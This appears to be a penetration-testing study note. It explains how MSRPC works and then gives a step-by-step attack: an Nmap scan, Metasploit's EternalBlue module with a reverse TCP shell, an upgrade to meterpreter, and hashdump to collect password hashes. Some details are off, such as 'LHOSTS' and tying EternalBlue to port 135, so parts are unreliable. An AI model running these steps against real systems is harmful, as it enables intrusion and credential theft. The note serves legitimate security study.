##### ***What is MSRPC?***
MSRPC serves as a bridge between different processes running on separate computers. MSRPC's client-server model enables a program to request services from another program on a different computer. This is done without requiring the requesting program to understand the intricacies of the network or the implementation details of the service it's asking for.

Here's a simplified sequence of steps to illustrate how MSRPC operates:

1. **Interface Definition**: Both client and server agree on an interface, which is like a contract specifying what operations can be performed and what data types will be used.
    
2. **Stub Generation**: Stubs are generated for both the client and the server based on this interface. These stubs handle the marshaling and unmarshaling of data, translating between the function calls in the code and the actual network messages that get sent.
    
3. **Client Request**: The client makes a function call, which is caught by the client stub. The stub packages this into an MSRPC request and sends it over the network. The request includes the interface identifier and the operation number (opnum) of the method being invoked.
    
4. **Server Processing**: The server stub receives the MSRPC request and unpacks it to determine which operation is being requested. It then performs the requested operation.
    
5. **Server Response**: After performing the operation, the server packs the result into an MSRPC response and sends it back to the client.
    
6. **Client Processing**: The client stub receives the response, unpacks it, and returns the data back to the client application as if it were the result of a local function call.
    
7. **Transport Mechanism**: Throughout this process, the MSRPC messages are typically tunneled through standard network protocols like SMB/CIFS, HTTP, or TCP.
##### ***Exploiting MSRPC***
Conduct an Nmap scan against a target. Depending on the host configuration, the RPC endpoint mapper can be accessed through TCP and UDP port 135, via SMB with a null or authenticated session (TCP 139 and 445), and as a web service listening on TCP port 593.
```
PORT      STATE SERVICE            VERSION
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
```

As you can see from the Nmap scan, port 135 is open. Use `msfconsole` to open metasploit, then run these commands:
```
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS <target_ip>
set RPORT <vulnerable_msrpc_port>
set LHOSTS <exploit_machine_ip>
set payload windows/x64/shell/reverse_tcp
exploit
```

This will execute the payload on the target Windows machine with the [[EternalBlue]] ms17-010 exploit. 

**Set up meterpreter**
After getting a successful connection, you should upgrade to a meterpreter shell. Use `CTRL + Z` to set the current session into the background. Then run the `use` command to enter the set up for a meterpreter shell. 
	`use post/multi/manage/shell_to_meterpreter`

Now set the session you want to use the meterpreter shell on with `set SESSION <session_id>`, then use `session -i <session_id>` to enter the meterpreter shell on the session for the Windows machine. 

Use `hashdump` inside meterpreter shell to get the passwords and user's of the Windows machine. Run `shell` to enter into the Windows machine shell. 
##### ***Resources***
- https://www.runecast.com/blog-posts/cve-2022-26809-ms-rpc-vulnerability-explained-and-covered
- https://book.hacktricks.xyz/network-services-pentesting/135-pentesting-msrpc

